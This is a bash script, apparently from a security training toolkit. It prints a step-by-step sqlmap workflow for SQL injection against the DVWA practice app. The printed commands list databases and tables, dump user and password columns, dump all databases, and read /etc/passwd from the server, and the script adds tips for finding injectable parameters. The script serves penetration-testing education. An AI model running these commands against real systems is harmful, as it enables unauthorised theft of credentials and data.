#!/usr/bin/env bash
# sqlmap/dump-database.sh — Enumerate and extract database contents via SQL injection
source "$(dirname "$0")/../common.sh"

show_help() {
    echo "Usage: $(basename "$0") [target-url] [-h|--help]"
    echo ""
    echo "Description:"
    echo "  Demonstrates how to enumerate and dump database contents through"
    echo "  SQL injection using sqlmap. Covers the full workflow from database"
    echo "  discovery to data extraction."
    echo ""
    echo "Examples:"
    echo "  $(basename "$0")                                                    # Show dump techniques"
    echo "  $(basename "$0") 'http://localhost:8080/vuln.php?id=1'              # Target a URL"
    echo "  $(basename "$0") --help                                             # Show this help message"
}

[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help && exit 0

require_cmd sqlmap "brew install sqlmap"

TARGET="${1:-}"

safety_banner

info "=== Database Enumeration & Extraction ==="
if [[ -n "$TARGET" ]]; then
    info "Target: ${TARGET}"
fi
echo ""

info "The enumeration workflow"
echo "   Database extraction follows a top-down approach:"
echo "   1. Detect injection point and database type"
echo "   2. List all databases (--dbs)"
echo "   3. List tables in a database (-D <db> --tables)"
echo "   4. List columns in a table (-D <db> -T <table> --columns)"
echo "   5. Dump specific data (-D <db> -T <table> -C <cols> --dump)"
echo ""
echo "   Always use --batch for non-interactive mode (auto-answers prompts)."
echo "   Use --threads to speed up extraction on large databases."
echo ""

URL="${TARGET:-'http://target/page.php?id=1'}"

# 1. Detect SQL injection and list databases
info "1) Detect SQL injection and list databases"
echo "   sqlmap -u ${URL} --batch --dbs"
echo ""

# 2. List tables in a specific database
info "2) List tables in a specific database"
echo "   sqlmap -u ${URL} --batch -D dvwa --tables"
echo ""

# 3. List columns in a table
info "3) List columns in a table"
echo "   sqlmap -u ${URL} --batch -D dvwa -T users --columns"
echo ""

# 4. Dump specific columns
info "4) Dump specific columns from a table"
echo "   sqlmap -u ${URL} --batch -D dvwa -T users -C user,password --dump"
echo ""

# 5. Dump entire table
info "5) Dump an entire table"
echo "   sqlmap -u ${URL} --batch -D dvwa -T users --dump"
echo ""

# 6. Dump all databases
info "6) Dump all databases (caution: can be very large)"
echo "   sqlmap -u ${URL} --batch --dump-all"
echo ""

# 7. Use specific injection technique
info "7) Use specific injection technique"
echo "   sqlmap -u ${URL} --batch --technique=BEU --dbs"
echo ""

# 8. Dump with CSV format output
info "8) Dump with CSV format output"
echo "   sqlmap -u ${URL} --batch -D dvwa -T users --dump --csv-del=\",\""
echo ""

# 9. Read a file from the server
info "9) Read a file from the server (requires FILE privileges)"
echo "   sqlmap -u ${URL} --batch --file-read=/etc/passwd"
echo ""

# 10. Full automated dump workflow
info "10) Full automated dump workflow"
echo "    sqlmap -u ${URL} --batch --dbs --tables --dump --threads=5"
echo ""

# Interactive demo (skip if non-interactive, e.g. running via make)
[[ ! -t 0 ]] && exit 0

echo ""
if [[ -n "$TARGET" ]] && [[ "$TARGET" =~ localhost|127\.0\.0\.1|:8080 ]]; then
    info "DVWA detected! Here is the typical SQLi URL format:"
    echo "   http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
    echo ""
    echo "   You also need to include the session cookie. Get it from your browser:"
    echo "   sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \\"
    echo "     --cookie='security=low; PHPSESSID=<your-session-id>' --batch --dbs"
    echo ""
else
    info "How to find the injectable parameter:"
    echo "   1. Browse the target web app and find forms or URL parameters"
    echo "   2. Look for parameters like ?id=1, ?page=2, ?search=test"
    echo "   3. Test manually: add a single quote (') and check for errors"
    echo "   4. Pass the full URL with parameter to sqlmap"
    echo ""
fi
